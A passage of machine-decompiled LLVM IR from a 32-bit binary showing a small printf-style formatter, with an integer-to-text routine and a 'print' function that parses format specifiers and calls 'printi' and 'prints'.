  %v1_804f81f = icmp eq i1 %v12_804f81b, false
  br i1 %v1_804f81f, label %dec_label_pc_804f836, label %dec_label_pc_804f821

dec_label_pc_804f821:                             ; preds = %dec_label_pc_804f81b
  %v1_804f825 = icmp eq i1 %v5_804f7ea, false
  br i1 %v1_804f825, label %dec_label_pc_804f836, label %dec_label_pc_804f827

dec_label_pc_804f827:                             ; preds = %dec_label_pc_804f821
  %v1_804f831 = sub i32 0, %tmp35
  %v5_804f833 = sext i32 %v1_804f831 to i64
  br label %dec_label_pc_804f836

dec_label_pc_804f836:                             ; preds = %dec_label_pc_804f821, %dec_label_pc_804f81b, %dec_label_pc_804f815, %dec_label_pc_804f827
  %stack_var_-24.0 = phi i64 [ %v5_804f7e7, %dec_label_pc_804f815 ], [ %v5_804f7e7, %dec_label_pc_804f81b ], [ %v5_804f7e7, %dec_label_pc_804f821 ], [ %v5_804f833, %dec_label_pc_804f827 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_804f815 ], [ 0, %dec_label_pc_804f81b ], [ 0, %dec_label_pc_804f821 ], [ 1, %dec_label_pc_804f827 ]
  %v15_804f839 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804f8977 = trunc i64 %stack_var_-24.0 to i32
  %v5_804f8978 = icmp eq i32 %v4_804f8977, 0
  %v1_804f89b15 = icmp eq i1 %v5_804f8978, false
  br i1 %v1_804f89b15, label %dec_label_pc_804f847.lr.ph, label %dec_label_pc_804f89d

dec_label_pc_804f847.lr.ph:                       ; preds = %dec_label_pc_804f836
  %v5_804f84a = sext i32 %tmp27 to i64
  br label %dec_label_pc_804f847

dec_label_pc_804f847:                             ; preds = %dec_label_pc_804f847.lr.ph, %dec_label_pc_804f86f
  %v3_804f86f18 = phi i8* [ %tmp48, %dec_label_pc_804f847.lr.ph ], [ %v22_804f86f, %dec_label_pc_804f86f ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_804f847.lr.ph ], [ %v5_804f894, %dec_label_pc_804f86f ]
  %v6_804f855 = and i64 %stack_var_-24.116, 4294967295
  %v12_804f855 = udiv i64 %v6_804f855, %v5_804f84a
  %v13_804f855 = trunc i64 %v12_804f855 to i32
  %v14_804f855 = urem i64 %v6_804f855, %v5_804f84a
  %v5_804f85a = trunc i64 %v14_804f855 to i8
  %v7_804f861 = icmp sgt i8 %v5_804f85a, 9
  br i1 %v7_804f861, label %dec_label_pc_804f863, label %dec_label_pc_804f86f

dec_label_pc_804f863:                             ; preds = %dec_label_pc_804f847
  %tmp52 = trunc i64 %v14_804f855 to i32
  %v5_804f866 = add i32 %tmp52, %tmp
  %v1_804f869 = add i32 %v5_804f866, 198
  %v11_804f869 = trunc i32 %v1_804f869 to i8
  br label %dec_label_pc_804f86f

dec_label_pc_804f86f:                             ; preds = %dec_label_pc_804f847, %dec_label_pc_804f863
  %stack_var_-36.0 = phi i8 [ %v11_804f869, %dec_label_pc_804f863 ], [ %v5_804f85a, %dec_label_pc_804f847 ]
  %v4_804f86f = ptrtoint i8* %v3_804f86f18 to i32
  %v5_804f86f = add i32 %v4_804f86f, -1
  %v22_804f86f = inttoptr i32 %v5_804f86f to i8*
  %v1_804f875 = add i8 %stack_var_-36.0, 48
  store i8 %v1_804f875, i8* %v22_804f86f, align 1
  %v5_804f894 = sext i32 %v13_804f855 to i64
  %v5_804f897 = icmp eq i32 %v13_804f855, 0
  %v1_804f89b = icmp eq i1 %v5_804f897, false
  br i1 %v1_804f89b, label %dec_label_pc_804f847, label %dec_label_pc_804f897.dec_label_pc_804f89d_crit_edge

dec_label_pc_804f897.dec_label_pc_804f89d_crit_edge: ; preds = %dec_label_pc_804f86f
  store i8* %v22_804f86f, i8** %stack_var_-40, align 4
  br label %dec_label_pc_804f89d

dec_label_pc_804f89d:                             ; preds = %dec_label_pc_804f897.dec_label_pc_804f89d_crit_edge, %dec_label_pc_804f836
  %v3_804f8da622 = phi i32 [ %v5_804f86f, %dec_label_pc_804f897.dec_label_pc_804f89d_crit_edge ], [ %v15_804f839, %dec_label_pc_804f836 ]
  %v3_804f8cb = phi i8* [ %v22_804f86f, %dec_label_pc_804f897.dec_label_pc_804f89d_crit_edge ], [ %tmp48, %dec_label_pc_804f836 ]
  %v4_804f89d = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804f89d, label %dec_label_pc_804f8d4, label %dec_label_pc_804f8a3

dec_label_pc_804f8a3:                             ; preds = %dec_label_pc_804f89d
  %v4_804f8a3 = icmp eq i32 %tmp31, 0
  br i1 %v4_804f8a3, label %dec_label_pc_804f8cb, label %dec_label_pc_804f8a9

dec_label_pc_804f8a9:                             ; preds = %dec_label_pc_804f8a3
  %v1_804f8ac = and i32 %tmp32, 2
  %v2_804f8ac = icmp eq i32 %v1_804f8ac, 0
  br i1 %v2_804f8ac, label %dec_label_pc_804f8cb, label %dec_label_pc_804f8b3

dec_label_pc_804f8b3:                             ; preds = %dec_label_pc_804f8a9
  %v3_804f8bb = inttoptr i32 %arg1 to i32*
  %v4_804f8bb = call i32 @printchar(i32* %v3_804f8bb, i32 45)
  %v4_804f8c6 = add i32 %tmp31, -1
  br label %dec_label_pc_804f8d4

dec_label_pc_804f8cb:                             ; preds = %dec_label_pc_804f8a9, %dec_label_pc_804f8a3
  %v4_804f8cb = ptrtoint i8* %v3_804f8cb to i32
  %v5_804f8cb = add i32 %v4_804f8cb, -1
  %v22_804f8cb = inttoptr i32 %v5_804f8cb to i8*
  store i8* %v22_804f8cb, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_804f8cb, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_804f8da6.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804f8d4

dec_label_pc_804f8d4:                             ; preds = %dec_label_pc_804f89d, %dec_label_pc_804f8b3, %dec_label_pc_804f8cb
  %v3_804f8da6 = phi i32 [ %v3_804f8da622, %dec_label_pc_804f89d ], [ %v3_804f8da6.pre, %dec_label_pc_804f8cb ], [ %v3_804f8da622, %dec_label_pc_804f8b3 ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_804f89d ], [ %tmp31, %dec_label_pc_804f8cb ], [ %v4_804f8c6, %dec_label_pc_804f8b3 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804f89d ], [ 0, %dec_label_pc_804f8cb ], [ 1, %dec_label_pc_804f8b3 ]
  %v1_804f8e0.cast = inttoptr i32 %v3_804f8da6 to i8*
  %v6_804f8e0 = call i32 @prints(i32 %arg1, i8* %v1_804f8e0.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_804f8eb = add i32 %v6_804f8e0, %stack_var_-28.0
  store i32 %v2_804f8eb, i32* @edx, align 4
  br label %dec_label_pc_804f8f0

dec_label_pc_804f8f0:                             ; preds = %dec_label_pc_804f7f0, %dec_label_pc_804f8d4
  %storemerge = phi i32 [ %v2_804f8eb, %dec_label_pc_804f8d4 ], [ %v6_804f805, %dec_label_pc_804f7f0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_804f86f, { 0, 1, 3, 2 }
  uselistorder i8 %v5_804f85a, { 1, 0 }
  uselistorder i64 %v6_804f855, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8f0, { 1, 0 }
  uselistorder label %dec_label_pc_804f8d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f86f, { 1, 0 }
  uselistorder label %dec_label_pc_804f847, { 1, 0 }
  uselistorder label %dec_label_pc_804f836, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f8f5 = load i32, i32* @ebp, align 4
  store i32 %v0_804f8f5, i32* %stack_var_-4, align 4
  %v4_804f8f5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804f8f5, i32* @ebp, align 4
  %v15_804f8f8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804faea = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.450 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804fb2051 = load i8, i8* %stack_var_8.450, align 1
  %v3_804fb2052 = zext i8 %v2_804fb2051 to i32
  %v5_804fb2053 = and i32 %arg2, -256
  %v6_804fb2054 = or i32 %v3_804fb2052, %v5_804fb2053
  store i32 %v6_804fb2054, i32* %eax.global-to-local, align 4
  %v4_804fb2255 = icmp eq i8 %v2_804fb2051, 0
  %v1_804fb2456 = icmp eq i1 %v4_804fb2255, false
  br i1 %v1_804fb2456, label %dec_label_pc_804f907, label %dec_label_pc_804fb2a

dec_label_pc_804f907:                             ; preds = %entry, %dec_label_pc_804fb1a
  %v0_804fb08 = phi i32 [ %v4_804f9cc72, %dec_label_pc_804fb1a ], [ %v15_804f8f8, %entry ]
  %v5_804fb2062 = phi i32 [ %v5_804fb20, %dec_label_pc_804fb1a ], [ %v5_804fb2053, %entry ]
  %stack_var_8.461 = phi i8* [ %stack_var_8.4, %dec_label_pc_804fb1a ], [ %stack_var_8.450, %entry ]
  %stack_var_-28.160 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804fb1a ], [ 0, %entry ]
  %stack_var_8.4.in59 = phi i32 [ %v5_804fb1a, %dec_label_pc_804fb1a ], [ %arg2, %entry ]
  %stack_var_12.158 = phi i32 [ %stack_var_12.0, %dec_label_pc_804fb1a ], [ %arg3, %entry ]
  %stack_var_-24.157 = phi i32 [ %stack_var_-24.0, %dec_label_pc_804fb1a ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in59, i32* %eax.global-to-local, align 4
  %v2_804f90a = load i8, i8* %stack_var_8.461, align 1
  %v3_804f90a = zext i8 %v2_804f90a to i32
  %v6_804f90a = or i32 %v3_804f90a, %v5_804fb2062
  store i32 %v6_804f90a, i32* %eax.global-to-local, align 4
  %v10_804f90c = icmp eq i8 %v2_804f90a, 37
  %v1_804f90e = icmp eq i1 %v10_804f90c, false
  br i1 %v1_804f90e, label %dec_label_pc_804fafe, label %dec_label_pc_804f914

dec_label_pc_804f914:                             ; preds = %dec_label_pc_804f907
  %v5_804f914 = add i32 %stack_var_8.4.in59, 1
  %v22_804f914 = inttoptr i32 %v5_804f914 to i8*
  store i32 %v5_804f914, i32* %eax.global-to-local, align 4
  %v2_804f927 = load i8, i8* %v22_804f914, align 1
  %v3_804f927 = zext i8 %v2_804f927 to i32
  %v5_804f927 = and i32 %v5_804f914, -256
  %v6_804f927 = or i32 %v3_804f927, %v5_804f927
  store i32 %v6_804f927, i32* %eax.global-to-local, align 4
  %v4_804f929 = icmp eq i8 %v2_804f927, 0
  br i1 %v4_804f929, label %dec_label_pc_804fb2a, label %dec_label_pc_804f931

dec_label_pc_804f931:                             ; preds = %dec_label_pc_804f914
  store i32 %v5_804f914, i32* %eax.global-to-local, align 4
  %v2_804f934 = load i8, i8* %v22_804f914, align 1
  %v3_804f934 = zext i8 %v2_804f934 to i32
  %v6_804f934 = or i32 %v3_804f934, %v5_804f927
  store i32 %v6_804f934, i32* %eax.global-to-local, align 4
  %v10_804f936 = icmp eq i8 %v2_804f934, 37
  br i1 %v10_804f936, label %dec_label_pc_804fafe, label %dec_label_pc_804f93e

dec_label_pc_804f93e:                             ; preds = %dec_label_pc_804f931
  store i32 %v5_804f914, i32* %eax.global-to-local, align 4
  %v2_804f941 = load i8, i8* %v22_804f914, align 1
  %v3_804f941 = zext i8 %v2_804f941 to i32
  %v6_804f941 = or i32 %v3_804f941, %v5_804f927
  store i32 %v6_804f941, i32* %eax.global-to-local, align 4
  %v10_804f943 = icmp eq i8 %v2_804f941, 45
  %v1_804f945 = icmp eq i1 %v10_804f943, false
  br i1 %v1_804f945, label %dec_label_pc_804f95a.preheader, label %dec_label_pc_804f947

dec_label_pc_804f947:                             ; preds = %dec_label_pc_804f93e
  %v5_804f947 = add i32 %stack_var_8.4.in59, 2
  %v22_804f947 = inttoptr i32 %v5_804f947 to i8*
  br label %dec_label_pc_804f95a.preheader

dec_label_pc_804f95a.preheader:                   ; preds = %dec_label_pc_804f947, %dec_label_pc_804f93e
  %stack_var_8.0.ph = phi i8* [ %v22_804f914, %dec_label_pc_804f93e ], [ %v22_804f947, %dec_label_pc_804f947 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804f93e ], [ 1, %dec_label_pc_804f947 ]
  %v4_804f95a15 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804f95a15, i32* %eax.global-to-local, align 4
  %v2_804f95d16 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804f95d17 = zext i8 %v2_804f95d16 to i32
  %v5_804f95d18 = and i32 %v4_804f95a15, -256
  %v6_804f95d19 = or i32 %v3_804f95d17, %v5_804f95d18
  store i32 %v6_804f95d19, i32* %eax.global-to-local, align 4
  %v7_804f95f24 = icmp eq i8 %v2_804f95d16, 48
  br i1 %v7_804f95f24, label %dec_label_pc_804f953, label %dec_label_pc_804f989.preheader

dec_label_pc_804f953:                             ; preds = %dec_label_pc_804f95a.preheader, %dec_label_pc_804f953
  %v4_804f95a26 = phi i32 [ %v5_804f953, %dec_label_pc_804f953 ], [ %v4_804f95a15, %dec_label_pc_804f95a.preheader ]
  %stack_var_-32.025 = phi i32 [ %v4_804f956, %dec_label_pc_804f953 ], [ %stack_var_-32.0.ph, %dec_label_pc_804f95a.preheader ]
  %v5_804f953 = add i32 %v4_804f95a26, 1
  %v22_804f953 = inttoptr i32 %v5_804f953 to i8*
  %v4_804f956 = or i32 %stack_var_-32.025, 2
  store i32 %v5_804f953, i32* %eax.global-to-local, align 4
  %v2_804f95d = load i8, i8* %v22_804f953, align 1
  %v3_804f95d = zext i8 %v2_804f95d to i32
  %v5_804f95d = and i32 %v5_804f953, -256
  %v6_804f95d = or i32 %v3_804f95d, %v5_804f95d
  store i32 %v6_804f95d, i32* %eax.global-to-local, align 4
  %v7_804f95f = icmp eq i8 %v2_804f95d, 48
  br i1 %v7_804f95f, label %dec_label_pc_804f953, label %dec_label_pc_804f989.preheader

dec_label_pc_804f989.preheader:                   ; preds = %dec_label_pc_804f953, %dec_label_pc_804f95a.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804f95a.preheader ], [ %v4_804f956, %dec_label_pc_804f953 ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804f95a.preheader ], [ %v22_804f953, %dec_label_pc_804f953 ]
  %v4_804f98928 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804f98928, i32* %eax.global-to-local, align 4
  %v2_804f98c29 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804f98c30 = zext i8 %v2_804f98c29 to i32
  %v5_804f98c31 = and i32 %v4_804f98928, -256
  %v6_804f98c32 = or i32 %v3_804f98c30, %v5_804f98c31
  store i32 %v6_804f98c32, i32* %eax.global-to-local, align 4
  %tmp73 = icmp ult i8 %v2_804f98c29, 48
  br i1 %tmp73, label %dec_label_pc_804f99b, label %dec_label_pc_804f992

dec_label_pc_804f965:                             ; preds = %dec_label_pc_804f992
  %v2_804f96e = mul i32 %stack_var_-36.038, 10
  store i32 %v4_804f98940, i32* %eax.global-to-local, align 4
  %v2_804f976 = load i8, i8* %stack_var_8.139, align 1
  %v3_804f976 = zext i8 %v2_804f976 to i32
  %v5_804f97d = add i32 %v3_804f976, %v2_804f96e
  %v1_804f980 = add i32 %v5_804f97d, -48
  %v5_804f986 = add i32 %v4_804f98940, 1
  %v22_804f986 = inttoptr i32 %v5_804f986 to i8*
  store i32 %v5_804f986, i32* %eax.global-to-local, align 4
  %v2_804f98c = load i8, i8* %v22_804f986, align 1
  %v3_804f98c = zext i8 %v2_804f98c to i32
  %v5_804f98c = and i32 %v5_804f986, -256
  %v6_804f98c = or i32 %v3_804f98c, %v5_804f98c
  store i32 %v6_804f98c, i32* %eax.global-to-local, align 4
  %tmp74 = icmp ult i8 %v2_804f98c, 48
  br i1 %tmp74, label %dec_label_pc_804f99b, label %dec_label_pc_804f992

dec_label_pc_804f992:                             ; preds = %dec_label_pc_804f989.preheader, %dec_label_pc_804f965
  %v5_804f98c41 = phi i32 [ %v5_804f98c, %dec_label_pc_804f965 ], [ %v5_804f98c31, %dec_label_pc_804f989.preheader ]
  %v4_804f98940 = phi i32 [ %v5_804f986, %dec_label_pc_804f965 ], [ %v4_804f98928, %dec_label_pc_804f989.preheader ]
  %stack_var_8.139 = phi i8* [ %v22_804f986, %dec_label_pc_804f965 ], [ %stack_var_8.0.lcssa, %dec_label_pc_804f989.preheader ]
  %stack_var_-36.038 = phi i32 [ %v1_804f980, %dec_label_pc_804f965 ], [ 0, %dec_label_pc_804f989.preheader ]
  store i32 %v4_804f98940, i32* %eax.global-to-local, align 4
  %v2_804f995 = load i8, i8* %stack_var_8.139, align 1
  %v3_804f995 = zext i8 %v2_804f995 to i32
  %v6_804f995 = or i32 %v3_804f995, %v5_804f98c41
  store i32 %v6_804f995, i32* %eax.global-to-local, align 4
  %tmp75 = icmp ult i8 %v2_804f995, 58
  br i1 %tmp75, label %dec_label_pc_804f965, label %dec_label_pc_804f99b

dec_label_pc_804f99b:                             ; preds = %dec_label_pc_804f965, %dec_label_pc_804f992, %dec_label_pc_804f989.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_804f989.preheader ], [ %stack_var_-36.038, %dec_label_pc_804f992 ], [ %v1_804f980, %dec_label_pc_804f965 ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_804f989.preheader ], [ %stack_var_8.139, %dec_label_pc_804f992 ], [ %v22_804f986, %dec_label_pc_804f965 ]
  %v4_804f989.lcssa = phi i32 [ %v4_804f98928, %dec_label_pc_804f989.preheader ], [ %v4_804f98940, %dec_label_pc_804f992 ], [ %v5_804f986, %dec_label_pc_804f965 ]
  %v5_804f98c.lcssa = phi i32 [ %v5_804f98c31, %dec_label_pc_804f989.preheader ], [ %v5_804f98c41, %dec_label_pc_804f992 ], [ %v5_804f98c, %dec_label_pc_804f965 ]
  store i32 %v4_804f989.lcssa, i32* %eax.global-to-local, align 4
  %v2_804f99e = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804f99e = zext i8 %v2_804f99e to i32
  %v6_804f99e = or i32 %v3_804f99e, %v5_804f98c.lcssa
  store i32 %v6_804f99e, i32* %eax.global-to-local, align 4
  %v10_804f9a0 = icmp eq i8 %v2_804f99e, 115
  %v1_804f9a2 = icmp eq i1 %v10_804f9a0, false
  br i1 %v1_804f9a2, label %dec_label_pc_804f9e6, label %dec_label_pc_804f9a4

dec_label_pc_804f9a4:                             ; preds = %dec_label_pc_804f99b
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804f9a7 = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804f9af = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804f9af = load i32, i32* %v1_804f9af, align 4
  store i32 %v2_804f9af, i32* %eax.global-to-local, align 4
  %v4_804f9b4 = icmp eq i32 %v2_804f9af, 0
  br i1 %v4_804f9b4, label %dec_label_pc_804f9c9, label %dec_label_pc_804f9ba

dec_label_pc_804f9ba:                             ; preds = %dec_label_pc_804f9a4
  store i32 %v2_804f9af, i32* %eax.global-to-local, align 4
  %v5_804f9bd = inttoptr i32 %v2_804f9af to i8*
  br label %dec_label_pc_804f9c9

dec_label_pc_804f9c9:                             ; preds = %dec_label_pc_804f9a4, %dec_label_pc_804f9ba
  %storemerge = phi i8* [ %v5_804f9bd, %dec_label_pc_804f9ba ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806a168.291, i32 0, i32 0), %dec_label_pc_804f9a4 ]
  %v4_804f9c9 = ptrtoint i8* %storemerge to i32
  store i32 %v4_804f9c9, i32* %eax.global-to-local, align 4
  %v5_804f9cc = add i32 %v0_804fb08, -4
  %v6_804f9cc = inttoptr i32 %v5_804f9cc to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804f9cc, align 4
  %v5_804f9cf = add i32 %v0_804fb08, -8
  %v6_804f9cf = inttoptr i32 %v5_804f9cf to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804f9cf, align 4
  %v0_804f9d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f9d2 = add i32 %v0_804fb08, -12
  %v3_804f9d2 = inttoptr i32 %v2_804f9d2 to i32*
  store i32 %v0_804f9d2, i32* %v3_804f9d2, align 4
  %v5_804f9d3 = add i32 %v0_804fb08, -16
  %v6_804f9d3 = inttoptr i32 %v5_804f9d3 to i32*
  store i32 %tmp3, i32* %v6_804f9d3, align 4
  %v5_804f9d6 = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804f9d6 = call i32 @prints(i32 %v4_804f9c9, i8* %v5_804f9d6, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.160)
  store i32 %v6_804f9d6, i32* %eax.global-to-local, align 4
  %v0_804f9db = load i32, i32* @esp, align 4
  %v1_804f9db = add i32 %v0_804f9db, 16
  %v5_804f9de = add i32 %v6_804f9d6, %stack_var_-28.160
  br label %dec_label_pc_804fb1a

dec_label_pc_804f9e6:                             ; preds = %dec_label_pc_804f99b
  store i32 %v4_804f989.lcssa, i32* %eax.global-to-local, align 4
  %v2_804f9e9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804f9e9 = zext i8 %v2_804f9e9 to i32
  %v6_804f9e9 = or i32 %v3_804f9e9, %v5_804f98c.lcssa
  store i32 %v6_804f9e9, i32* %eax.global-to-local, align 4
  %v10_804f9eb = icmp eq i8 %v2_804f9e9, 100
  %v1_804f9ed = icmp eq i1 %v10_804f9eb, false
  br i1 %v1_804f9ed, label %dec_label_pc_804fa1f, label %dec_label_pc_804f9ef

dec_label_pc_804f9ef:                             ; preds = %dec_label_pc_804f9e6
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804f9f2 = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804f9fa = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804f9fa = load i32, i32* %v1_804f9fa, align 4
  store i32 %v2_804f9fa, i32* %eax.global-to-local, align 4
  %v1_804f9ff = add i32 %v0_804fb08, -8
  %v2_804f9ff = inttoptr i32 %v1_804f9ff to i32*
  store i32 97, i32* %v2_804f9ff, align 4
  %v5_804fa01 = add i32 %v0_804fb08, -12
  %v6_804fa01 = inttoptr i32 %v5_804fa01 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804fa01, align 4
  %v5_804fa04 = add i32 %v0_804fb08, -16
  %v6_804fa04 = inttoptr i32 %v5_804fa04 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804fa04, align 4
  %v1_804fa07 = add i32 %v0_804fb08, -20
  %v2_804fa07 = inttoptr i32 %v1_804fa07 to i32*
  store i32 1, i32* %v2_804fa07, align 4
  %v1_804fa09 = add i32 %v0_804fb08, -24
  %v2_804fa09 = inttoptr i32 %v1_804fa09 to i32*
  store i32 10, i32* %v2_804fa09, align 4
  %v0_804fa0b = load i32, i32* %eax.global-to-local, align 4
  %v2_804fa0b = add i32 %v0_804fb08, -28
  %v3_804fa0b = inttoptr i32 %v2_804fa0b to i32*
  store i32 %v0_804fa0b, i32* %v3_804fa0b, align 4
  %v5_804fa0c = add i32 %v0_804fb08, -32
  %v6_804fa0c = inttoptr i32 %v5_804fa0c to i32*
  store i32 %tmp3, i32* %v6_804fa0c, align 4
  %v1_804fa0f = call i32 @printi(i32 %v1_804f9f2)
  store i32 %v1_804fa0f, i32* %eax.global-to-local, align 4
  %v0_804fa14 = load i32, i32* @esp, align 4
  %v1_804fa14 = add i32 %v0_804fa14, 32
  %v5_804fa17 = add i32 %v1_804fa0f, %stack_var_-28.160
  br label %dec_label_pc_804fb1a

dec_label_pc_804fa1f:                             ; preds = %dec_label_pc_804f9e6
  store i32 %v4_804f989.lcssa, i32* %eax.global-to-local, align 4
  %v2_804fa22 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804fa22 = zext i8 %v2_804fa22 to i32
  %v6_804fa22 = or i32 %v3_804fa22, %v5_804f98c.lcssa
  store i32 %v6_804fa22, i32* %eax.global-to-local, align 4
  %v10_804fa24 = icmp eq i8 %v2_804fa22, 120
  %v1_804fa26 = icmp eq i1 %v10_804fa24, false
  br i1 %v1_804fa26, label %dec_label_pc_804fa58, label %dec_label_pc_804fa28

dec_label_pc_804fa28:                             ; preds = %dec_label_pc_804fa1f
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804fa2b = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804fa33 = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804fa33 = load i32, i32* %v1_804fa33, align 4
  store i32 %v2_804fa33, i32* %eax.global-to-local, align 4
  %v1_804fa38 = add i32 %v0_804fb08, -8
  %v2_804fa38 = inttoptr i32 %v1_804fa38 to i32*
  store i32 97, i32* %v2_804fa38, align 4
  %v5_804fa3a = add i32 %v0_804fb08, -12
  %v6_804fa3a = inttoptr i32 %v5_804fa3a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804fa3a, align 4
  %v5_804fa3d = add i32 %v0_804fb08, -16
  %v6_804fa3d = inttoptr i32 %v5_804fa3d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804fa3d, align 4
  %v1_804fa40 = add i32 %v0_804fb08, -20
  %v2_804fa40 = inttoptr i32 %v1_804fa40 to i32*
  store i32 0, i32* %v2_804fa40, align 4
  %v1_804fa42 = add i32 %v0_804fb08, -24
  %v2_804fa42 = inttoptr i32 %v1_804fa42 to i32*
  store i32 16, i32* %v2_804fa42, align 4
  %v0_804fa44 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fa44 = add i32 %v0_804fb08, -28
  %v3_804fa44 = inttoptr i32 %v2_804fa44 to i32*
  store i32 %v0_804fa44, i32* %v3_804fa44, align 4
  %v5_804fa45 = add i32 %v0_804fb08, -32
  %v6_804fa45 = inttoptr i32 %v5_804fa45 to i32*
  store i32 %tmp3, i32* %v6_804fa45, align 4
  %v1_804fa48 = call i32 @printi(i32 %v1_804fa2b)
  store i32 %v1_804fa48, i32* %eax.global-to-local, align 4
  %v0_804fa4d = load i32, i32* @esp, align 4
  %v1_804fa4d = add i32 %v0_804fa4d, 32
  %v5_804fa50 = add i32 %v1_804fa48, %stack_var_-28.160
  br label %dec_label_pc_804fb1a

dec_label_pc_804fa58:                             ; preds = %dec_label_pc_804fa1f
  store i32 %v4_804f989.lcssa, i32* %eax.global-to-local, align 4
  %v2_804fa5b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804fa5b = zext i8 %v2_804fa5b to i32
  %v6_804fa5b = or i32 %v3_804fa5b, %v5_804f98c.lcssa
  store i32 %v6_804fa5b, i32* %eax.global-to-local, align 4
  %v10_804fa5d = icmp eq i8 %v2_804fa5b, 88
  %v1_804fa5f = icmp eq i1 %v10_804fa5d, false
  br i1 %v1_804fa5f, label %dec_label_pc_804fa91, label %dec_label_pc_804fa61

dec_label_pc_804fa61:                             ; preds = %dec_label_pc_804fa58
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804fa64 = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804fa6c = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804fa6c = load i32, i32* %v1_804fa6c, align 4
  store i32 %v2_804fa6c, i32* %eax.global-to-local, align 4
  %v1_804fa71 = add i32 %v0_804fb08, -8
  %v2_804fa71 = inttoptr i32 %v1_804fa71 to i32*
  store i32 65, i32* %v2_804fa71, align 4
  %v5_804fa73 = add i32 %v0_804fb08, -12
  %v6_804fa73 = inttoptr i32 %v5_804fa73 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804fa73, align 4
  %v5_804fa76 = add i32 %v0_804fb08, -16
  %v6_804fa76 = inttoptr i32 %v5_804fa76 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804fa76, align 4
  %v1_804fa79 = add i32 %v0_804fb08, -20
  %v2_804fa79 = inttoptr i32 %v1_804fa79 to i32*
  store i32 0, i32* %v2_804fa79, align 4
  %v1_804fa7b = add i32 %v0_804fb08, -24
  %v2_804fa7b = inttoptr i32 %v1_804fa7b to i32*
  store i32 16, i32* %v2_804fa7b, align 4
  %v0_804fa7d = load i32, i32* %eax.global-to-local, align 4
  %v2_804fa7d = add i32 %v0_804fb08, -28
  %v3_804fa7d = inttoptr i32 %v2_804fa7d to i32*
  store i32 %v0_804fa7d, i32* %v3_804fa7d, align 4
  %v5_804fa7e = add i32 %v0_804fb08, -32
